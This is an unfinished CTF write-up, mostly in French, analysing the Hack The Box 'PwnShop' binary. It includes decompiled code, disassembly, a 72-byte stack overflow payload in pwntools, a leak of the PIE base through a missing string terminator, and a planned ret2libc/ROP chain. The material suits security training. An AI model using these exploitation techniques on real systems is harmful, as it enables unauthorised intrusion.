\chapter{Pwn shop}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}

\section{Analysis}
\subsection{File info}
\begin{verbatim}
$ file pwnshop
pwnshop: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), 
    dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
    BuildID[sha1]=e354418962cffebad74fa44061f8c58d92c0e706, for GNU/Linux 3.2.0,
    stripped
\end{verbatim}

\subsection{Security}
\begin{verbatim}
$ pwntools-pwn checksec --file=./pwnshop
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
\end{verbatim}

pas d'execution sur la stack PIE enabled.

\begin{verbatim}
$ echo 0 | sudo tee  /proc/sys/kernel/randomize_va_spac
\end{verbatim}

\subsection{Execution}


\subsection{static analysis}

\subsubsection{Find main}
\subsubsection{main}
\begin{verbatim}
undefined  [16] main(void)
{
  int iVar1;
  ulong in_RCX;
  char cVar2;

  init();
  puts("========= HTB PwnShop ===========");
  while( true ) {
    while( true ) {
      puts("What do you wanna do?");
      printf("1> Buy\n2> Sell\n3> Exit\n> ");
      iVar1 = getchar();
      getchar();
      cVar2 = (char)iVar1;
      if (cVar2 != '2') break;
      sell();
    }
    if (cVar2 == '3') break;
    if (cVar2 == '1') {
      buy();
    }
    else {
      puts("Please try again.");
    }
  }
  return ZEXT816(in_RCX) << 0x40;
}
\end{verbatim}

\subsubsection{buy}

\begin{verbatim}
void buy(void)
{
  undefined auStack_48 [72];

  puts("Sorry, we aren\'t selling right now.");
  printf("But you can place a request. \nEnter details: ");
  read(0,auStack_48,0x50);
  return;
}
\end{verbatim}

buffer overflow scan 80 sur buffer de 72. Mais normalement il ne devrait pas
être suffisant pour ecraser l'ip car \verb-72 buffer + 8 rbp + 8 rip- il nous manque 8
sauf que en fait c'est marrant le code de la fonction ne fait même pas un 
\verb+push rbp+. Donc  on peut bien ecraser l'\verb+ip+ cela nous fait donc un
payload à 72. Mais on ne peut pas faire un ROP avec car pas d'overflow au dela
de \verb+ip+



\begin{verbatim}
def buy():
    #payload = b'A' * 80
    payload = b'A' * 72
    payload += p64(0x55555555532a) # to buy
    #payload += p64(0x55555555526a) # to sell
    #payload += p64(0x5555555550f5) # to caller
    #payload += p64(0x5555555550a0) # to main
    io.sendline("1")
    log.debug(f'received : {io.clean()}')
    log.debug(f'sending : {payload}')
    io.sendline(payload)
    log.debug(f'received : {io.clean()}')
\end{verbatim}

\begin{verbatim}
DEBUG] received : b"Sorry, we aren't selling right now.\nBut you can place a request. \nEnter details: "
[DEBUG] sending : b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*SUUUU\x00\x00'
[DEBUG] received : b"Sorry, we aren't selling right now.\n"
[*] Switching to interactive mode
[*] Process '/home/benmusashi/documents/pentesting-games/htb/binary_track/pwnshop/pwnshop' 
    stopped with exit code -11 (SIGSEGV) (pid 1596897)
\end{verbatim}



\subsubsection{sell}
\begin{verbatim}
   0x55555555526a:	push   rbp
   0x55555555526b:	lea    rax,[rip+0x2e4e]        # 0x5555555580c0
   0x555555555272:	lea    rdi,[rip+0xd8b]        # 0x555555556004
   0x555555555279:	push   rbx
   0x55555555527a:	sub    rsp,0x38
   0x55555555527e:	mov    QWORD PTR [rsp+0x28],rax
   0x555555555283:	xor    eax,eax
   0x555555555285:	lea    rbp,[rsp+0x20]
   0x55555555528a:	call   0x555555555040 <printf@plt>
   0x55555555528f:	mov    rsi,rsp
   0x555555555292:	xor    eax,eax
   0x555555555294:	mov    ecx,0x8
   0x555555555299:	mov    rdi,rsi
   0x55555555529c:	mov    edx,0x1f
   0x5555555552a1:	mov    QWORD PTR [rsp+0x20],0x0
   0x5555555552aa:	rep stos DWORD PTR es:[rdi],eax
   0x5555555552ac:	xor    edi,edi
   0x5555555552ae:	call   0x555555555060 <read@plt>
   0x5555555552b3:	lea    rdi,[rip+0xd65]        # 0x55555555601f
   0x5555555552ba:	xor    eax,eax
   0x5555555552bc:	call   0x555555555040 <printf@plt>
   0x5555555552c1:	xor    edi,edi
   0x5555555552c3:	mov    rsi,rbp
   0x5555555552c6:	mov    edx,0x8
   0x5555555552cb:	call   0x555555555060 <read@plt>
   0x5555555552d0:	lea    rsi,[rip+0xd66]        # 0x55555555603d
   0x5555555552d7:	mov    rdi,rbp
   0x5555555552da:	call   0x555555555070 <strcmp@plt>
   0x5555555552df:	test   eax,eax
   0x5555555552e1:	jne    0x555555555312
   0x5555555552e3:	lea    rdi,[rip+0xd5a]        # 0x555555556044
   0x5555555552ea:	mov    ebx,eax
   0x5555555552ec:	call   0x555555555030 <puts@plt>
   0x5555555552f1:	mov    rdi,QWORD PTR [rsp+0x28]
   0x5555555552f6:	mov    eax,ebx
   0x5555555552f8:	mov    ecx,0x10
   0x5555555552fd:	mov    edx,0x40
   0x555555555302:	rep stos DWORD PTR es:[rdi],eax
   0x555555555304:	xor    edi,edi
   0x555555555306:	mov    rsi,QWORD PTR [rsp+0x28]
   0x55555555530b:	call   0x555555555060 <read@plt>
   0x555555555310:	jmp    0x555555555323
   0x555555555312:	mov    rsi,rbp
   0x555555555315:	lea    rdi,[rip+0xd6c]        # 0x555555556088
   0x55555555531c:	xor    eax,eax
   0x55555555531e:	call   0x555555555040 <printf@plt>
   0x555555555323:	add    rsp,0x38
   0x555555555327:	pop    rbx
   0x555555555328:	pop    rbp
   0x555555555329:	ret
\end{verbatim}

\begin{verbatim}

void sell(void)

{
  int iVar1;
  long lVar2;
  undefined4 *puVar3;
  byte bVar4;
  undefined4 sell_product [8];
  undefined8 sell_price;
  undefined4 *details;

  bVar4 = 0;
  details = &DAT_001040c0;
  printf("What do you wish to sell? ");
  sell_price = 0;
  puVar3 = sell_product;
  for (lVar2 = 8; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
  }
  read(0,sell_product,0x1f);
  printf("How much do you want for it? ");
  read(0,&sell_price,8);
  iVar1 = strcmp((char *)&sell_price,"13.37\n");
  if (iVar1 == 0) {
    puts("Sounds good. Leave details here so I can ask my guy to take a look.");
    puVar3 = details;
    for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
    }
    read(0,details,0x40);
  }
  else {
    printf("What? %s? The best I can do is 13.37$\n",&sell_price);
  }
  return;
}
\end{verbatim}

ce bloc d'instruction
\begin{verbatim}
  puVar3 = sell_product;
  for (lVar2 = 8; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
  }
\end{verbatim}
correspond à cela 
\begin{verbatim}
   0x55555555528f:	mov    rsi,rsp
   0x555555555292:	xor    eax,eax
   0x555555555294:	mov    ecx,0x8
   0x555555555299:	mov    rdi,rsi
   0x55555555529c:	mov    edx,0x1f
   0x5555555552a1:	mov    QWORD PTR [rsp+0x20],0x0
   0x5555555552aa:	rep stos DWORD PTR es:[rdi],eax
   0x5555555552ac:	xor    edi,edi
   0x5555555552ae:	call   0x555555555060 <read@plt>
\end{verbatim}

et doit plus se lire de cette manière donc cela correspond au RAZ des buffers
\begin{verbatim}
for (i = 32 ; i != 0 ; i--)
    sell_productt[i] = 0
\end{verbatim}


{\bf tete de la stack (local vars (0x38 = 56 bytes)}:
\begin{verbatim}
rbp
rbx
rsp = rbp - 0x38
    details:      scanné à rsp + 0x28   pour 64 byes
    sell_value:   scanné à rsp + 0x20   pour 8 bytes
    sell_item:    scanné à rsp          pour 0x1f =31bytes
\end{verbatim}

donc normalement on a un overflow sur \verb+details+ pour l'atteindre il
faudra rentrer \verb+13.37+ sur le prix. Sauf que non car \verb+detail+ est un
pointeur vers l'adresse leaked qui est donc une variable globale dans
\verb+.bss+

ca c'est bizare:

\begin{verbatim}
lea    rbp,[rsp+0x20]
\end{verbatim}

{\bf le truc c'est que si on rentre plus que 8 sur \verb+sell_value+ il ne va pas enregistrer
la fin de chaine (\verb+\x0+). Comme la valeur ne sera pas égale à 13.73, il va passer au
print en \verb+%s+ et afficher la chaine jusqu'au prochain \verb+\x0+ donc il
devrait afficher la suite de la stack et donc l'addresse de \verb+detail+ car
au début de la fonction on a cela: 

\begin{verbatim}
0x55555555526b:	lea    rax,[rip+0x2e4e]        # 0x5555555580c0
.. .SNIP. ..
0x55555555527e:	mov    QWORD PTR [rsp+0x28],rax
\end{verbatim}

{\bf on va print une addresse}

l'entry point (l'addresse relative de base) est :
\begin{verbatim}
gef>  i file
	Entry point: 0x1120
gef>  x/10i 0x126b
   0x126b:	lea    rax,[rip+0x2e4e]        # 0x40c0
\end{verbatim}

donc \verb+absolute - relative = piebase+
\verb+0x005555555580c0 - 40c0 = 555555554000+

Une fois le programme débuté dans gdb on corrèle bien :
\begin{verbatim}
gef>  piebase
Calculated VA from pwnshop = 0x555555554000
\end{verbatim}

par contre quand on fait le test si l'on rentre 7 char il affiche
\begin{verbatim}
How much do you want for it? azertyu
What? azertyu
??UUUU? The best I can do is 13.37$
\end{verbatim}

si on rentre 8 char il affiche:
\begin{verbatim}
How much do you want for it? azertyui
What? azertyui??UUUU? The best I can do is 13.37$
\end{verbatim}

\section{Exploit}

\subsection{Strategy}

donc normalement on est capable de calculer l'addresse de base du programme
si pas d'ASLR on devrait pouvoir calculer l'addresse de \verb+system+

le principe que l'on va avoir va être de :
\begin{enumerate}
    \item calculer \verb+piebase+ (\verb+addresse leaked - 40c0+)
    \item d'ajouter le décalage de chargement de libc
\begin{verbatim}
$ ldd pwnshop
	linux-vdso.so.1 (0x00007ffff7fc8000)
	libc.so.6 => /usr/lib/libc.so.6 (0x00007ffff7db5000)
	/lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fca000)
\end{verbatim}
    \item d'ajouter le décalage de \verb+system+ dans libc
\begin{verbatim}
$ readelf -s /usr/lib/libc.so.6 |grep system
  1023: 00000000000493d0    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
\end{verbatim}
\end{enumerate}

après il faut faire un classique:
\begin{verbatim}
 ROPgadget --binary pwnshop |grep 'pop rdi'
0x00000000000013c3 : pop rdi ; ret
\end{verbatim}




\subsection{dynamic analysis}

\subsubsection{find main}
\begin{verbatim}
gef>  i file
        Entry point: 0x1120
gef>  b *0x1120
Breakpoint 1 at 0x1120
gef>  r
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x1120
gef>  i file
        Entry point: 0x555555555120
gef>  delete breakpoints 1
gef>  x/20i 0x555555555120
   0x555555555120:      endbr64
   0x555555555124:      xor    ebp,ebp
   0x555555555126:      mov    r9,rdx
   0x555555555129:      pop    rsi
   0x55555555512a:      mov    rdx,rsp
   0x55555555512d:      and    rsp,0xfffffffffffffff0
   0x555555555131:      push   rax
   0x555555555132:      push   rsp
   0x555555555133:      lea    r8,[rip+0x296]        # 0x5555555553d0
   0x55555555513a:      lea    rcx,[rip+0x21f]        # 0x555555555360
   0x555555555141:      lea    rdi,[rip+0xffffffffffffff58]        # 0x5555555550a0
   0x555555555148:      call   QWORD PTR [rip+0x2e92]        # 0x555555557fe0
.. .SNIP. ..
gef>  x/10i 0x5555555550a0
   0x5555555550a0:      push   rbp
   0x5555555550a1:      xor    eax,eax
   0x5555555550a3:      lea    rbp,[rip+0x1079]        # 0x555555556123
   0x5555555550aa:      push   rbx
   0x5555555550ab:      push   rcx
   0x5555555550ac:      call   0x55555555521e
   0x5555555550b1:      lea    rdi,[rip+0x1049]        # 0x555555556101
   0x5555555550b8:      call   0x555555555030 <puts@plt>
   0x5555555550bd:      mov    rdi,rbp
   0x5555555550c0:      call   0x555555555030 <puts@plt>
gef>  b *0x5555555550a0
Breakpoint 3 at 0x5555555550a0
\end{verbatim}



\subsubsection{breakpoints}
\begin{itemize}
    \item \verb+b *0x5555555550a0+: start of main
    \item \verb+b *0x55555555532a+: start of buy
    \item \verb+b *0x55555555526a+: start of sell
    \item \verb+b *0x555555555272+: après mov rax leak
\end{itemize}

\subsection{Exploit build}


\begin{verbatim}
$ pwntools-pwn template --host 10.10.10.10 --port 10 ./ > pwn-bin.py
\end{verbatim}

